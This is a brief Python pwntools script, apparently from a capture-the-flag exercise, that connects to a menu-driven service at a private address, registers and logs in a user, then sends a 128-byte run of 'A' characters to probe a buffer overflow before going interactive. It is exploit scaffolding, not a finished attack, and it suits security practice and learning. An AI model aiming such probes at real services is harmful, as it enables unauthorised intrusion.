from pwn import *
s = remote('192.168.50.4',1234)
raw_input()
def sign_up(name):
  s.recvuntil('>')
  s.send('1\n')
  s.recvuntil('>')
  s.send(name)
def sign_in(name):
  s.recvuntil('>')
  s.send('2\n')
  s.recvuntil('>')
  s.send(name)
def change_name(name):
  s.recvuntil('>>')
  s.send('7\n')
  s.recvuntil('>>')
  s.send(name)
def send_timeline(dat):
  s.recvuntil('>>')
  s.send('4\n')
  s.recvuntil('>>')
  s.send(dat)
def send_ms(name,dat): 
  s.recvuntil('>>')
  s.send('5\n')
  s.recvuntil('>>')
  s.send(name)
  s.recvuntil('>>')
  s.send(dat)
sign_up('a1\n')
sign_in('a1\n')
send_timeline('A'*128)
s.interactive()
